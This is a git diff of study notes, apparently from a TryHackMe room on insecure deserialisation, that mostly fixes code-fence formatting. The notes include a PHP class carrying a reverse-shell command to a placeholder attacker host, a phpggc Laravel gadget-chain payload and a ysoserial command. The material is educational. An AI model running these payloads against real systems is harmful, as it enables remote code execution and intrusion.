@@ -18,7 +18,8 @@
 $noteArray = array("title" => "My THM Note", "content" => "Welcome to THM!");
 $serialisedNote = serialize($noteArray);  // Serialisation
 file_put_contents('note.txt', $serialisedNote);  // Saving to file
-?>```
+?>
+```
 
 ## Deserialisation
 - [ ] **Definition**: Process of converting serialised data back into an object.
@@ -31,7 +32,8 @@ $serialisedNote = file_get_contents('note.txt');  // Reading serialised data
 $noteArray = unserialize($serialisedNote);  // Deserialisation
 echo "Title: " . $noteArray['title'] . "<br>";
 echo "Content: " . $noteArray['content'];
-?>```
+?>
+```
 
 ## Insecure Deserialisation Vulnerabilities
 - [ ] **Risk**: Attackers can manipulate serialised data to execute unauthorised actions or steal data.
@@ -67,7 +69,7 @@ echo "Content: " . $noteArray['content'];
 	```php
 	<?php
 	class MaliciousUserData {
-		public $command = 'ncat - [ ]nv ATTACK_IP 4444 -e /bin/sh';
+		public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
 	}
 	$maliciousUserData = new MaliciousUserData();
 	$serializedData = serialize($maliciousUserData);
@@ -82,18 +84,18 @@ echo "Content: " . $noteArray['content'];
     - [ ] **Purpose**: Generates gadget chains for PHP object injection.
     - [ ] **Usage**:
 	```bash
-		php phpggc Laravel/RCE3 system whoami
+	php phpggc Laravel/RCE3 system whoami
 	``` 
     - [ ] **Example Payload**:
-```php
-O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}
-        ```
+	```php
+	O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:					 	         {s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}
+	```
 2. **Ysoserial (Java)**:
     - [ ] **Purpose**: Generates payloads for Java deserialisation vulnerabilities.
     - [ ] **Usage**:
-```java
-        java - [ ]jar ysoserial.jar CommonsCollections1 'calc.exe'
-```
+	```java
+	java -jar ysoserial.jar CommonsCollections1 'calc.exe'
+	```
         
 ---
 ## Mitigation Strategies
